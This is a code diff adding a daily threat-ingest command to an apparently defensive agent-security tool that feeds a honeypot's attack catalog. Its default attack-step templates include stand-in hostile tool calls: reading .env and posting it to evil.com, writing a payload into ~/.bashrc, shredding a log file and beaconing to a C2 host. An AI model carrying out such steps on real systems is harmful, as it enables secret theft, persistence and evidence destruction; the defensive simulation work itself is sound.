@@ -6,6 +6,7 @@ Extended commands:
   navil crawl schedule           — set up recurring scan
   navil crawl run-scan           — run a one-off full scan pipeline
   navil crawl threat-scan        — crawl threat intel sources for novel attack vectors
+  navil crawl ingest-daily       — ingest daily_threats/YYYY-MM-DD.yaml into public_attacks.yaml
   navil crawl history            — show scan history
   navil crawl diff <s1> <s2>     — compare two scans
   navil crawl trend              — show trend over recent scans
@@ -483,6 +484,296 @@ def _threat_scan_command(cli, args: argparse.Namespace) -> int:  # type: ignore[
     return 0
 
 
+# ── Daily threat ingest ───────────────────────────────────────
+
+# Maps daily_threats category strings (from safemcp/categories.py snake_case)
+# to the ALLCAPS keys used in public_attacks.yaml / _CATEGORY_TO_GENERATOR.
+_CATEGORY_MAP: dict[str, str] = {
+    # Existing categories
+    "prompt_injection": "DATA_EXFILTRATION",
+    "data_exfiltration": "DATA_EXFILTRATION",
+    "credential_access": "DATA_EXFILTRATION",
+    "privilege_escalation": "PRIVILEGE_ESCALATION",
+    "reconnaissance": "RECONNAISSANCE",
+    "command_and_control": "COMMAND_AND_CONTROL",
+    "supply_chain": "SUPPLY_CHAIN",
+    "denial_of_service": "RATE_SPIKE",
+    "lateral_movement": "LATERAL_MOVEMENT",
+    "persistence": "PERSISTENCE",
+    "defense_evasion": "DEFENSE_EVASION",
+    "resource_hijacking": "RATE_SPIKE",
+    "code_execution": "INFRA",
+    "social_engineering": "DATA_EXFILTRATION",
+    "configuration_tampering": "INFRA",
+    "information_disclosure": "DATA_EXFILTRATION",
+    # Agent-native categories
+    "multimodal_smuggling": "DATA_EXFILTRATION",
+    "handshake_hijacking": "HANDSHAKE",
+    "rag_memory_poisoning": "RAG_POISON",
+    "agent_collusion": "COLLUSION",
+    "cognitive_exploitation": "COGNITIVE",
+    "temporal_stateful": "TEMPORAL",
+    "output_weaponization": "OUTPUT_WEAPON",
+    "tool_schema_injection": "SUPPLY_CHAIN",
+    "context_window_manipulation": "DATA_EXFILTRATION",
+    "model_supply_chain": "SUPPLY_CHAIN",
+    "cross_tenant_leakage": "DATA_EXFILTRATION",
+    "delegation_abuse": "PRIVILEGE_ESCALATION",
+    "feedback_loop_poisoning": "RAG_POISON",
+    "covert_channel": "COVERT_CHANNEL",
+}
+
+
+def _ingest_daily_command(cli, args: argparse.Namespace) -> int:  # type: ignore[no-untyped-def]
+    """Handle `navil crawl ingest-daily`.
+
+    Reads daily_threats/YYYY-MM-DD.yaml (today or --date), converts each threat
+    into the public_attacks.yaml format, deduplicates against existing entries,
+    and appends novel ones.  This is the missing link that makes auto-learning
+    actually work: scheduled task → daily_threats/ → public_attacks.yaml →
+    AttackVariantGenerator → honeypot.
+    """
+    import os
+    from datetime import date
+
+    import yaml
+
+    data_dir = Path(os.path.dirname(__file__)).parent / "data"
+    daily_dir = data_dir / "daily_threats"
+    public_path = data_dir / "public_attacks.yaml"
+
+    # Resolve which date file to ingest
+    target_date = args.date or date.today().isoformat()
+    daily_file = daily_dir / f"{target_date}.yaml"
+
+    if not daily_file.exists():
+        print(f"No daily threat file found: {daily_file}", flush=True)
+        return 1
+
+    with open(daily_file) as f:
+        daily_data = yaml.safe_load(f)
+
+    threats = daily_data.get("threats", [])
+    if not threats:
+        print(f"No threats in {daily_file}")
+        return 0
+
+    # Load existing public_attacks.yaml
+    with open(public_path) as f:
+        catalog = yaml.safe_load(f)
+    existing_attacks: list[dict] = catalog.get("attacks", [])
+    existing_names = {a["name"] for a in existing_attacks}
+    existing_descs = [a.get("description", "").lower() for a in existing_attacks]
+
+    added = 0
+    skipped_dup = 0
+    skipped_no_cat = 0
+
+    for threat in threats:
+        raw_cat = threat.get("category", "").lower().replace("-", "_")
+        attack_name = threat.get("attack_name", "").lower().replace(" ", "_").replace("-", "_")
+        # Slugify to valid YAML key
+        import re
+
+        attack_name = re.sub(r"[^\w]", "_", attack_name).strip("_")
+
+        # Skip if name already exists
+        if attack_name in existing_names:
+            skipped_dup += 1
+            continue
+
+        # Dedup by description keyword overlap (same threshold as _dedup_against_existing)
+        desc = threat.get("description", "")
+        desc_words = set(desc.lower().split())
+        is_dup = False
+        for existing_desc in existing_descs:
+            existing_words = set(existing_desc.split())
+            if not desc_words or not existing_words:
+                continue
+            overlap = len(desc_words & existing_words)
+            min_len = min(len(desc_words), len(existing_words))
+            if min_len > 0 and overlap / min_len > 0.6:
+                is_dup = True
+                break
+        if is_dup:
+            skipped_dup += 1
+            continue
+
+        # Map category
+        catalog_cat = _CATEGORY_MAP.get(raw_cat)
+        if not catalog_cat:
+            print(f"  Warning: unknown category '{raw_cat}' for '{attack_name}' — skipping")
+            skipped_no_cat += 1
+            continue
+
+        severity = threat.get("severity", "medium").upper()
+
+        # Build a minimal but valid attack_steps list based on category
+        attack_steps = _default_steps_for_category(catalog_cat)
+
+        # Build indicators from detection_approach text
+        detection = threat.get("detection_approach", "")
+        indicators = _extract_indicators(detection)
+
+        # Build source_reference from sources list + marker
+        sources = threat.get("sources", [])
+        marker = threat.get("marker_2026", "")
+        source_ref = sources[0] if sources else marker or f"navil-threat-research {target_date}"
+
+        entry: dict = {
+            "name": attack_name,
+            "description": desc.strip(),
+            "category": catalog_cat,
+            "severity": severity,
+            "attack_steps": attack_steps,
+            "indicators": indicators,
+            "source_reference": source_ref,
+        }
+        if threat.get("cve"):
+            entry["cve"] = threat["cve"]
+
+        existing_attacks.append(entry)
+        existing_names.add(attack_name)
+        existing_descs.append(desc.lower())
+        added += 1
+        print(f"  + {attack_name} [{catalog_cat}] {severity}")
+
+    if added == 0:
+        print(
+            f"No new threats to add "
+            f"(skipped {skipped_dup} duplicates, {skipped_no_cat} unknown categories)."
+        )
+        return 0
+
+    # Write back
+    catalog["attacks"] = existing_attacks
+    with open(public_path, "w") as f:
+        yaml.dump(catalog, f, default_flow_style=False, sort_keys=False, allow_unicode=True)
+
+    total = len(existing_attacks)
+    print(f"\nIngested {added} new threats into public_attacks.yaml ({total} total).")
+    print(f"Skipped: {skipped_dup} duplicates, {skipped_no_cat} unknown categories.")
+    return 0
+
+
+def _default_steps_for_category(cat: str) -> list[dict]:
+    """Return minimal representative attack_steps for a category."""
+    _steps: dict[str, list[dict]] = {
+        "SUPPLY_CHAIN": [
+            {
+                "method": "tools/call",
+                "tool": "inject_backdoor",
+                "target_server": "http://mcp-server:3000",
+            }
+        ],
+        "DATA_EXFILTRATION": [
+            {"method": "tools/call", "tool": "read_file", "args": {"path": ".env"}},
+            {
+                "method": "tools/call",
+                "tool": "fetch_url",
+                "args": {"url": "https://evil.com/exfil", "body": "$DATA"},
+            },
+        ],
+        "RAG_POISON": [
+            {"method": "tools/call", "tool": "db_read", "args": {"action": "embed_poison"}}
+        ],
+        "TEMPORAL": [
+            {
+                "method": "tools/call",
+                "tool": "admin_panel",
+                "args": {"action": "state_mutate_during_plan"},
+            }
+        ],
+        "RATE_SPIKE": [
+            {"method": "tools/call", "tool": "invoke", "args": {"repeat": 50}, "repeat": 50}
+        ],
+        "PERSISTENCE": [
+            {
+                "method": "tools/call",
+                "tool": "write_file",
+                "args": {"path": "~/.bashrc", "body": "$PAYLOAD"},
+            }
+        ],
+        "PRIVILEGE_ESCALATION": [{"method": "tools/call", "tool": "credential_dump", "args": {}}],
+        "RECONNAISSANCE": [{"method": "tools/list", "target": "*", "repeat": 8}],
+        "LATERAL_MOVEMENT": [
+            {
+                "method": "tools/call",
+                "tool": "api_call",
+                "args": {"url": "http://internal-mcp/pivot"},
+            }
+        ],
+        "DEFENSE_EVASION": [
+            {
+                "method": "tools/call",
+                "tool": "run_script",
+                "args": {"cmd": "shred -u /var/log/mcp.log"},
+            }
+        ],
+        "COMMAND_AND_CONTROL": [
+            {
+                "method": "tools/call",
+                "tool": "http_get",
+                "args": {"url": "https://c2.evil.com/beacon"},
+            }
+        ],
+        "HANDSHAKE": [
+            {"method": "tools/call", "tool": "web_request", "args": {"action": "oauth_token_steal"}}
+        ],
+        "COLLUSION": [
+            {"method": "tools/call", "tool": "api_call", "args": {"action": "relay_to_peer_agent"}}
+        ],
+        "COGNITIVE": [
+            {"method": "tools/call", "tool": "query_db", "args": {"action": "inject_false_context"}}
+        ],
+        "OUTPUT_WEAPON": [
+            {"method": "tools/call", "tool": "execute", "args": {"action": "weaponize_output"}}
+        ],
+        "INFRA": [{"method": "tools/call", "tool": "admin_console", "args": {"action": "rce"}}],
+        "COVERT_CHANNEL": [
+            {"method": "tools/call", "tool": "api_call", "args": {"action": "timing_side_channel"}}
+        ],
+    }
+    return _steps.get(cat, [{"method": "tools/call", "tool": "unknown", "args": {}}])
+
+
+def _extract_indicators(detection_text: str) -> list[str]:
+    """Extract snake_case indicator names from a detection approach description."""
+    import re
+
+    # Pull out noun phrases that look like detector signals
+    # Look for: "alert on X", "monitor for X", "detect X", "flag X"
+    candidates: list[str] = []
+    patterns = [
+        r"alert on ([^;,\.]+)",
+        r"monitor for ([^;,\.]+)",
+        r"detect(?:ing)? ([^;,\.]+)",
+        r"flag(?:ging)? ([^;,\.]+)",
+        r"implement ([^;,\.]+)",
+    ]
+    for pat in patterns:
+        for m in re.finditer(pat, detection_text, re.IGNORECASE):
+            phrase = m.group(1).strip()
+            # Slugify
+            slug = re.sub(r"[^\w\s]", "", phrase).lower().strip()
+            slug = re.sub(r"\s+", "_", slug)
+            slug = slug[:60]  # cap length
+            if slug:
+                candidates.append(slug)
+
+    # Deduplicate while preserving order, cap at 6
+    seen: set[str] = set()
+    result: list[str] = []
+    for c in candidates:
+        if c not in seen:
+            seen.add(c)
+            result.append(c)
+        if len(result) >= 6:
+            break
+
+    return result or ["anomalous_tool_call_pattern"]
+
+
 # ── Registration ──────────────────────────────────────────────
 
 
@@ -694,3 +985,15 @@ def register(subparsers: argparse._SubParsersAction, cli_class: type) -> None:
         help="Crawl threat intel sources for novel attack vectors",
     )
     threat_parser.set_defaults(func=lambda cli, args: _threat_scan_command(cli, args))
+
+    # ── crawl ingest-daily ────────────────────────────────────
+    ingest_parser = crawl_sub.add_parser(
+        "ingest-daily",
+        help="Ingest daily_threats/YYYY-MM-DD.yaml into public_attacks.yaml",
+    )
+    ingest_parser.add_argument(
+        "--date",
+        default=None,
+        help="Date to ingest (YYYY-MM-DD). Defaults to today.",
+    )
+    ingest_parser.set_defaults(func=lambda cli, args: _ingest_daily_command(cli, args))
